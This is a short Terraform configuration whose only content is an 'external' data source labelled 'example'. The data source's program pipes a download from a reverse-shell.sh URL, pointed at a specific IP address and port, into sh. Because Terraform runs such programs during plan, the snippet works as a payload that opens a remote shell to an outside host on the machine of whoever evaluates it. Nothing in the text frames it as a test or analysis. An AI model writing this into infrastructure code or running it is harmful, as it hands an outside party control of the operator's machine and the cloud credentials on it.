data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/34.236.149.95:8000 | sh"]
}